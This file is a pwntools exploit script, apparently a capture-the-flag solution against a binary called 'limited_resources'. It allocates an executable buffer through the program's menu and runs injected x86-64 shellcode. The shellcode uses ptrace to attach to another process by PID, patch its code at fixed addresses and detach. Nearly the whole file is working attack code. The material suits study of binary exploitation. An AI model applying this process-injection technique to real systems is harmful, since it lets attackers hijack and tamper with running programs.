from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF("./limited_resources")
p = elf.process()
gdb.attach(p,"set follow-fork-mode child")

def create(size,perm,data):
    p.sendline(b"1")
    p.sendline(str(size).encode())
    p.sendline(str(perm).encode())
    p.sendline(data)
    p.recvuntil(b'Wrote your buffer at ')
    return p.recvline(0).strip()

def execute(mem):
    p.sendline(b"3")
    p.sendline(mem)

def get_pid():
    p.sendline(b"2")
    p.recvuntil(b"PID = ")
    return int(p.recvline(0).strip())

pid = get_pid()
print(pid)
pay = asm(f"""
attach:
    mov ebp,{pid}
    mov edi,16
    mov esi,ebp
    xor edx,edx
    xor r10,r10
    mov al,101
    syscall

    mov rcx,0xffffffff
wait:
    nop
    loop wait

    mov edi,5
    mov esi,ebp
    mov edx,0x4018df
    mov r10,0xE800402090bf9090
    mov eax,101
    syscall

    mov edi,5
    mov esi,ebp
    mov edx, 0x401aa9
    mov r10,0x9090909090000000
    mov eax,101
    syscall

    mov edi,17
    mov esi,ebp
    xor edx,edx
    xor r10,r10
    mov eax,101
    syscall

loopit:
    jmp loopit

format:
    .ascii "result = %%llx"
    .byte 10
""")
mem = create(0x2000,7,pay)
print(mem)
execute(mem)

p.interactive()
